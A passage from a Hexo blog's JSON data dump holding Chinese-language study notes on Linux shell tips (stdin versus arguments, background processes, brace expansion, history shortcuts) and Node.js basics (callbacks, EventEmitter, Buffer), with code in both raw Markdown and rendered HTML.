class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!! 自动使用上一个命令；</span><br>！！<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux-Shell\"><a href=\"#Linux-Shell\" class=\"headerlink\" title=\"Linux Shell\"></a>Linux Shell</h1><ul>\n<li>标准输入和命令参数的区别；</li>\n<li>后台运行命令在推出中断后也全部退出；</li>\n<li>单引号和双引号表示字符串的区别；</li>\n<li>有的命令和sudo一起用就会Command not found;</li>\n</ul>\n<h2 id=\"一、标准输入和参数的区别\"><a href=\"#一、标准输入和参数的区别\" class=\"headerlink\" title=\"一、标准输入和参数的区别\"></a>一、标准输入和参数的区别</h2><h3 id=\"1-标准输入和参数\"><a href=\"#1-标准输入和参数\" class=\"headerlink\" title=\"1.标准输入和参数\"></a>1.标准输入和参数</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">错误</span><br>where connect.sh | rm<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">正确</span><br>rm $(where connect.sh)<br><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>标准输入就是编程语言中诸如scanf或者readline命令，而参数是指程序的main函数传入的args字符数组；</p>\n<p>如果命令能够让终端阻塞，说明该命令接受标准输入，反之不接受；</p>\n</blockquote>\n<h3 id=\"2-后台运行程序\"><a href=\"#2-后台运行程序\" class=\"headerlink\" title=\"2.后台运行程序\"></a>2.后台运行程序</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">python manager.py run server 0.0.0.0<br></code></pre></td></tr></table></figure>\n\n<p>远程登录服务器然后启动Django服务，此时可以通过服务器IP测试，但是终端此时是阻塞状态；</p>\n<p>可以在命令后加上<code>&amp;</code>符号，命令行就不会阻塞，响应后续命令；</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">(python manager.py runserver 0.0.0.0  &amp;)<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>每一个终端其实都是一个shell进程，在该终端执行的程序其实都是这个shell进程分出来的子进程；</p>\n<p>正常情况下，shell进程会阻塞，等待子进程退出才重新接受新的命令；</p>\n<p>加上<code>&amp;</code>符号只是让shell进程不在阻塞可以继续响应命令，但是无论如何，一旦终端关闭，所有依附的子进程都会关闭；</p>\n<p>而（cmd &amp;）这样运行命令，则是将cmd命令挂到systemed系统守护进程；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nohub some_cmd &amp;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-单双引号的区别\"><a href=\"#3-单双引号的区别\" class=\"headerlink\" title=\"3.单双引号的区别\"></a>3.单双引号的区别</h3><blockquote>\n<p>不同的shell会有细微区别；</p>\n<p>对于<code>$</code>,<code>()</code>,这几个符号，单引号包围的字符串不会做任何转义，双引号会；</p>\n</blockquote>\n<ul>\n<li>如果<code>$</code>读出的参数字符包含空格，应该用双引号括起来，否则会出错；</li>\n</ul>\n<h3 id=\"4-sudo找不到命令\"><a href=\"#4-sudo找不到命令\" class=\"headerlink\" title=\"4. sudo找不到命令\"></a>4. sudo找不到命令</h3><p>有时普通用户可以用的命令，加上sudo权限却无法使用；</p>\n<ul>\n<li>原因在于该脚本仅存在于该用户的环境变量中；</li>\n<li>解决方法是使用脚本文件的路径；</li>\n</ul>\n<h2 id=\"二、Linux-Shell提高效率的技巧\"><a href=\"#二、Linux-Shell提高效率的技巧\" class=\"headerlink\" title=\"二、Linux Shell提高效率的技巧\"></a>二、Linux Shell提高效率的技巧</h2><h3 id=\"1-相似文件名\"><a href=\"#1-相似文件名\" class=\"headerlink\" title=\"1.相似文件名\"></a>1.相似文件名</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">onefile twofile threefile</span><br>echo &#123;one,two,three&#125;file<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">one1 one2 one3 two1 two2 two3 three1 three2 three3</span><br>echo &#123;one,two,three&#125;&#123;1,2,3&#125;<br></code></pre></td></tr></table></figure>\n\n<p>应用：命令拓展参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">给file复制一个file.bak的副本</span><br>cp /path/file&#123;,.bak&#125; <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除file&#123;1，3，5&#125;</span><br>rm file&#123;1,3,4&#125;.txt<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">移动相同类型文件</span><br>mv *.&#123;c,cpp&#125; src/<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-输入路径名称太麻烦\"><a href=\"#2-输入路径名称太麻烦\" class=\"headerlink\" title=\"2. 输入路径名称太麻烦\"></a>2. 输入路径名称太麻烦</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">返回home</span><br>cd  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">返回上一个目录</span><br>cd -<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!$会替换上一次命令最后的路径</span><br>chmod +x !$<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!*会替换上一次命令输入的所有文件路径</span><br>chmod +x !*<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!! 自动使用上一个命令；</span><br>！！<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"_content":"# Node JS From W3C\n\n## 一、NodeJS回调函数\n\n> 异步编程依托于回调来实现；\n>\n> 回调函数完成任务后会被调用，Node使用了大量得回调函数，Node所有Api都支持回调函数；\n>\n> 例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。\n\n```js\nfunction foo1(name,age,callback){}\nfunction foo2(value,callback1,callback2){}\n```\n\n```js\n//阻塞代码实例\nvar fs=require(\"fs\");\nvar data=fs.readFileSync('../../assets/test.txt');\nconsole.log(data.toString());\nconsole.log(\"Program Ended\");\n\n\n//非阻塞代码实例\nvar fs=require(\"fs\");\nfs.readFile('../../assets/test.txt',function(err,data){\n    if(err) return console.error(err);\n    console.log(data.toString());\n});\nconsole.log(\"Program Ended\");\n```\n\n第一个实例在文件读取完之后才执行；第二个实例我们不需要等待文件读取完；可以在读取文件的同时处理其他逻辑；\n\n## 二、NodeJS事件循环\n\n### 1.events\n\n> NodeJS是单进程单线程应用程序，但是因为V8引擎提供得异步执行回调接口，通过这些接口可以处理大量并发，性能较高；\n>\n> Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。\n>\n> Node.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.\n>\n> Node.js使用事件驱动模型，当web server接收到请求，就把它关闭进行处理，然后服务下一个web请求；\n>\n> 请求完成，放回处理队列，当到达队列开头，将结果返回给用户；\n>\n> webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）\n\n```js\n//引入events模块；\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n\n//绑定事件及事件得处理程序\neventEmitter.on('eventName',eventHandler);\n\n//触发事件\neventEmitter.emit('eventName');\n```\n\n```js\n//引入events模块\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n//创建事件处理程序\nvar connectHandler=function connected(){\n    console.log('连接成功。');\n    //触发data_received事件\n    eventEmitter.emit('data_received');\n}\n//绑定connection事件处理程序\neventEmitter.on('connection',connectHandler);\n//使用匿名函数绑定data_received事件\neventEmitter.on('data_received',function(){\n    console.log('数据接收成功。');\n});\n//触发connection事件\neventEmitter.emit('connection');\nconsole.log(\"程序执行完毕。\");\n```\n\n### 2.Node是如何工作的？\n\n> Node应用程序中，执行异步操作得函数将回调函数作为最后一个参数，回调函数接受错误对象作为第一个参数；\n\n```js\n\nvar fs=require(\"fs\");\n//将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。\nfs.readFile('../../assets/test.txt',function(err,data){\n    if(err) return console.error(err);\n    console.log(data.toString());\n});\nconsole.log(\"程序执行完毕\");\n```\n\n### 3.EventEmitter\n\n> Node.js得所有异步I/O操作都会在完成时返回一个事件到事件队列；\n>\n> Node.js里面得许多对象都会分发事件，所有这些事件得对象都是events.EventEmitter的实例；\n\n#### EventEmitter类：事件触发与事件监听器功能的封装\n\n```js\nvar EventEmitter=require('events').EventEmitter;\nvar event=new EventEmitter();\nevent.on('some_event',function(){\n    console.log('some_event 事件触发');\n});\nevent.on('some_event',function(){\n    console.log(\"Martin wang 的事件触发了\");\n});\nsetTimeout(function(){\n    event.emit('some_event');\n},1000);\n```\n\n原理：event对象注册了事件some_event的一个监听器，然后1000ms后向event对象发送事件some_event此时调用其监听器；\n\nEventEmitter的每个事件由一个事件名和若干参数组成，事件名是一个字符串；每个事件支持若干个事件监听器；\n\n两个事件监听器回调函数被先后调用；\n\n```js\nvar events=require('events');\nvar emitter=new events.EventEmitter();\n\n//监听器1\nvar listener1=function listener1(){\n    console.log('监听器listener1执行');\n}   \n//监听器2\nvar listener2=function listener2(){\n    console.log('监听器listener2执行');\n}\n//绑定connection事件，处理函数为listener1   \nemitter.addListener('connection',listener1);\n//绑定connection事件，处理函数为listener2\nemitter.on('connection',listener2);\nvar eventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\n//处理connection事件\nemitter.emit('connection');\n//移除绑定的listener1函数   \nemitter.removeListener('connection',listener1);\nconsole.log(\"listener1不再受监听。\");\n//触发连接事件\nemitter.emit('connection');\neventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\nconsole.log(\"程序执行完毕。\");\n```\n\n### 4.继承EventEmitter\n\n> 大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。\n>\n> 为什么要这样做呢？原因有两点：\n>\n> 首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。\n>\n> 其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。\n\n## 三、NodeJS Buffer\n\n> JS语言自身只有字符串数据类型，没有二进制数据类型；\n>\n> 但是处理TCP流或者文件流时，必须使用二进制数据；因此NodeJS定义了一个Buffer类，创建一个专门存放二进制数据的缓存区；\n\n### 1.Buffer与字符编码\n\n> Buffer实例一般用于表示编码字符的序列，比如UTF-8等；\n\n```js\nconst buf=Buffer.from('hello world','ascii');\nconsole.log(buf.toString('hex'));\nconsole.log(buf.toString('base64'));\n```\n\n### 2.Buffer类\n\n```js\n//创建长度为10字节的Buffer实例\nconst buf1=Buffer.alloc(10);\n//创建长度为10字节，且用0填充的Buffer实例\nconst buf2=Buffer.alloc(10,1);\n//创建长度为10字节，且未初始化的Buffer实例\nconst buf3=Buffer.allocUnsafe(10);\n//创建一个包含[0x1,0x2,0x3]的Buffer实例\nconst buf4=Buffer.from([1,2,3]);\n//创建一个包含UTF-8字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf5=Buffer.from('test');\n//创建一个包含Latin-1字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf6=Buffer.from('test','latin1');\n\n```\n\n### 3.写入缓冲区\n\n```js\nbuf.write(string[,offset[,length]][,encoding])\n// string 字符串\n// offset 开始写入的索引值\n// length 写入的字节数\n// encoding 编码方式\nbuf.write('hello world');\nconsole.log(buf.toString());\nconsole.log(buf.toJSON());\nconsole.log(buf.toString('base64'));\n//缓冲区合并\nconst buffer1=Buffer.from(('菜鸟教程'));\nconst buffer2=Buffer.from(('www.runoob.com'));\nconst buffer3=Buffer.concat([buffer1,buffer2]);\nconsole.log(\"buffer3 内容: \"+buffer3.toString());\n//缓冲区比较\nconst buffer4=Buffer.from('ABC');\nconst buffer5=Buffer.from('ABCD');\nconst result=buffer4.compare(buffer5);\nif(result<0){\n    console.log(buffer4+\"在\"+buffer5+\"之前\");\n}else if(result==0){\n    console.log(buffer4+\"与\"+buffer5+\"相同\");\n}else{\n    console.log(buffer4+\"在\"+buffer5+\"之后\");\n}\n//拷贝缓冲区\nconst buffer6=Buffer.from('ABC');\n//拷贝一个缓冲区\nconst buffer7=Buffer.alloc(3);\nbuffer6.copy(buffer7);\nconsole.log(\"buffer7 content: \"+buffer7.toString());\n//缓冲区裁剪\nconst buffer8=Buffer.from('runoob');\n//剪切缓冲区\nconst buffer9=buffer8.slice(0,2);\nconsole.log(\"buffer9 content: \"+buffer9.toString());\n```\n\n方法名参考JS的字符串处理；\n\n## 四、NodeJS Stream\n\n> Stream是一个抽象接口，node中很多对象实现了这个接口；\n>\n> 例如对http服务器发起请求的request对象就是一个stream还有stdout；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/NodeJS From W3C.md","raw":"# Node JS From W3C\n\n## 一、NodeJS回调函数\n\n> 异步编程依托于回调来实现；\n>\n> 回调函数完成任务后会被调用，Node使用了大量得回调函数，Node所有Api都支持回调函数；\n>\n> 例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。\n\n```js\nfunction foo1(name,age,callback){}\nfunction foo2(value,callback1,callback2){}\n```\n\n```js\n//阻塞代码实例\nvar fs=require(\"fs\");\nvar data=fs.readFileSync('../../assets/test.txt');\nconsole.log(data.toString());\nconsole.log(\"Program Ended\");\n\n\n//非阻塞代码实例\nvar fs=require(\"fs\");\nfs.readFile('../../assets/test.txt',function(err,data){\n    if(err) return console.error(err);\n    console.log(data.toString());\n});\nconsole.log(\"Program Ended\");\n```\n\n第一个实例在文件读取完之后才执行；第二个实例我们不需要等待文件读取完；可以在读取文件的同时处理其他逻辑；\n\n## 二、NodeJS事件循环\n\n### 1.events\n\n> NodeJS是单进程单线程应用程序，但是因为V8引擎提供得异步执行回调接口，通过这些接口可以处理大量并发，性能较高；\n>\n> Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。\n>\n> Node.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.\n>\n> Node.js使用事件驱动模型，当web server接收到请求，就把它关闭进行处理，然后服务下一个web请求；\n>\n> 请求完成，放回处理队列，当到达队列开头，将结果返回给用户；\n>\n> webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）\n\n```js\n//引入events模块；\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n\n//绑定事件及事件得处理程序\neventEmitter.on('eventName',eventHandler);\n\n//触发事件\neventEmitter.emit('eventName');\n```\n\n```js\n//引入events模块\nvar events=require('events');\n//创建eventEmitter对象\nvar eventEmitter=new events.EventEmitter();\n//创建事件处理程序\nvar connectHandler=function connected(){\n    console.log('连接成功。');\n    //触发data_received事件\n    eventEmitter.emit('data_received');\n}\n//绑定connection事件处理程序\neventEmitter.on('connection',connectHandler);\n//使用匿名函数绑定data_received事件\neventEmitter.on('data_received',function(){\n    console.log('数据接收成功。');\n});\n//触发connection事件\neventEmitter.emit('connection');\nconsole.log(\"程序执行完毕。\");\n```\n\n### 2.Node是如何工作的？\n\n> Node应用程序中，执行异步操作得函数将回调函数作为最后一个参数，回调函数接受错误对象作为第一个参数；\n\n```js\n\nvar fs=require(\"fs\");\n//将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。\nfs.readFile('../../assets/test.txt',function(err,data){\n    if(err) return console.error(err);\n    console.log(data.toString());\n});\nconsole.log(\"程序执行完毕\");\n```\n\n### 3.EventEmitter\n\n> Node.js得所有异步I/O操作都会在完成时返回一个事件到事件队列；\n>\n> Node.js里面得许多对象都会分发事件，所有这些事件得对象都是events.EventEmitter的实例；\n\n#### EventEmitter类：事件触发与事件监听器功能的封装\n\n```js\nvar EventEmitter=require('events').EventEmitter;\nvar event=new EventEmitter();\nevent.on('some_event',function(){\n    console.log('some_event 事件触发');\n});\nevent.on('some_event',function(){\n    console.log(\"Martin wang 的事件触发了\");\n});\nsetTimeout(function(){\n    event.emit('some_event');\n},1000);\n```\n\n原理：event对象注册了事件some_event的一个监听器，然后1000ms后向event对象发送事件some_event此时调用其监听器；\n\nEventEmitter的每个事件由一个事件名和若干参数组成，事件名是一个字符串；每个事件支持若干个事件监听器；\n\n两个事件监听器回调函数被先后调用；\n\n```js\nvar events=require('events');\nvar emitter=new events.EventEmitter();\n\n//监听器1\nvar listener1=function listener1(){\n    console.log('监听器listener1执行');\n}   \n//监听器2\nvar listener2=function listener2(){\n    console.log('监听器listener2执行');\n}\n//绑定connection事件，处理函数为listener1   \nemitter.addListener('connection',listener1);\n//绑定connection事件，处理函数为listener2\nemitter.on('connection',listener2);\nvar eventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\n//处理connection事件\nemitter.emit('connection');\n//移除绑定的listener1函数   \nemitter.removeListener('connection',listener1);\nconsole.log(\"listener1不再受监听。\");\n//触发连接事件\nemitter.emit('connection');\neventListeners=require('events').EventEmitter.listenerCount(emitter,'connection');\nconsole.log(eventListeners+\"个监听器监听连接事件。\");\nconsole.log(\"程序执行完毕。\");\n```\n\n### 4.继承EventEmitter\n\n> 大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。\n>\n> 为什么要这样做呢？原因有两点：\n>\n> 首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。\n>\n> 其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。\n\n## 三、NodeJS Buffer\n\n> JS语言自身只有字符串数据类型，没有二进制数据类型；\n>\n> 但是处理TCP流或者文件流时，必须使用二进制数据；因此NodeJS定义了一个Buffer类，创建一个专门存放二进制数据的缓存区；\n\n### 1.Buffer与字符编码\n\n> Buffer实例一般用于表示编码字符的序列，比如UTF-8等；\n\n```js\nconst buf=Buffer.from('hello world','ascii');\nconsole.log(buf.toString('hex'));\nconsole.log(buf.toString('base64'));\n```\n\n### 2.Buffer类\n\n```js\n//创建长度为10字节的Buffer实例\nconst buf1=Buffer.alloc(10);\n//创建长度为10字节，且用0填充的Buffer实例\nconst buf2=Buffer.alloc(10,1);\n//创建长度为10字节，且未初始化的Buffer实例\nconst buf3=Buffer.allocUnsafe(10);\n//创建一个包含[0x1,0x2,0x3]的Buffer实例\nconst buf4=Buffer.from([1,2,3]);\n//创建一个包含UTF-8字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf5=Buffer.from('test');\n//创建一个包含Latin-1字节[0x74,0x65,0x73,0x74]的Buffer实例\nconst buf6=Buffer.from('test','latin1');\n\n```\n\n### 3.写入缓冲区\n\n```js\nbuf.write(string[,offset[,length]][,encoding])\n// string 字符串\n// offset 开始写入的索引值\n// length 写入的字节数\n// encoding 编码方式\nbuf.write('hello world');\nconsole.log(buf.toString());\nconsole.log(buf.toJSON());\nconsole.log(buf.toString('base64'));\n//缓冲区合并\nconst buffer1=Buffer.from(('菜鸟教程'));\nconst buffer2=Buffer.from(('www.runoob.com'));\nconst buffer3=Buffer.concat([buffer1,buffer2]);\nconsole.log(\"buffer3 内容: \"+buffer3.toString());\n//缓冲区比较\nconst buffer4=Buffer.from('ABC');\nconst buffer5=Buffer.from('ABCD');\nconst result=buffer4.compare(buffer5);\nif(result<0){\n    console.log(buffer4+\"在\"+buffer5+\"之前\");\n}else if(result==0){\n    console.log(buffer4+\"与\"+buffer5+\"相同\");\n}else{\n    console.log(buffer4+\"在\"+buffer5+\"之后\");\n}\n//拷贝缓冲区\nconst buffer6=Buffer.from('ABC');\n//拷贝一个缓冲区\nconst buffer7=Buffer.alloc(3);\nbuffer6.copy(buffer7);\nconsole.log(\"buffer7 content: \"+buffer7.toString());\n//缓冲区裁剪\nconst buffer8=Buffer.from('runoob');\n//剪切缓冲区\nconst buffer9=buffer8.slice(0,2);\nconsole.log(\"buffer9 content: \"+buffer9.toString());\n```\n\n方法名参考JS的字符串处理；\n\n## 四、NodeJS Stream\n\n> Stream是一个抽象接口，node中很多对象实现了这个接口；\n>\n> 例如对http服务器发起请求的request对象就是一个stream还有stdout；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"NodeJS From W3C","published":1,"date":"2023-04-05T07:29:35.904Z","updated":"2023-04-05T08:35:12.085Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"clg4k4gqk0007ww9cctcc0j5x","content":"<h1 id=\"Node-JS-From-W3C\"><a href=\"#Node-JS-From-W3C\" class=\"headerlink\" title=\"Node JS From W3C\"></a>Node JS From W3C</h1><h2 id=\"一、NodeJS回调函数\"><a href=\"#一、NodeJS回调函数\" class=\"headerlink\" title=\"一、NodeJS回调函数\"></a>一、NodeJS回调函数</h2><blockquote>\n<p>异步编程依托于回调来实现；</p>\n<p>回调函数完成任务后会被调用，Node使用了大量得回调函数，Node所有Api都支持回调函数；</p>\n<p>例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">foo1</span>(<span class=\"hljs-params\">name,age,callback</span>)&#123;&#125;<br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">foo2</span>(<span class=\"hljs-params\">value,callback1,callback2</span>)&#123;&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//阻塞代码实例</span><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br><span class=\"hljs-keyword\">var</span> data=fs.<span class=\"hljs-title function_\">readFileSync</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Program Ended&quot;</span>);<br><br><br><span class=\"hljs-comment\">//非阻塞代码实例</span><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br>fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(err);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br>&#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Program Ended&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<p>第一个实例在文件读取完之后才执行；第二个实例我们不需要等待文件读取完；可以在读取文件的同时处理其他逻辑；</p>\n<h2 id=\"二、NodeJS事件循环\"><a href=\"#二、NodeJS事件循环\" class=\"headerlink\" title=\"二、NodeJS事件循环\"></a>二、NodeJS事件循环</h2><h3 id=\"1-events\"><a href=\"#1-events\" class=\"headerlink\" title=\"1.events\"></a>1.events</h3><blockquote>\n<p>NodeJS是单进程单线程应用程序，但是因为V8引擎提供得异步执行回调接口，通过这些接口可以处理大量并发，性能较高；</p>\n<p>Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。</p>\n<p>Node.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.</p>\n<p>Node.js使用事件驱动模型，当web server接收到请求，就把它关闭进行处理，然后服务下一个web请求；</p>\n<p>请求完成，放回处理队列，当到达队列开头，将结果返回给用户；</p>\n<p>webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入events模块；</span><br><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-comment\">//创建eventEmitter对象</span><br><span class=\"hljs-keyword\">var</span> eventEmitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><br><span class=\"hljs-comment\">//绑定事件及事件得处理程序</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;eventName&#x27;</span>,eventHandler);<br><br><span class=\"hljs-comment\">//触发事件</span><br>eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;eventName&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入events模块</span><br><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-comment\">//创建eventEmitter对象</span><br><span 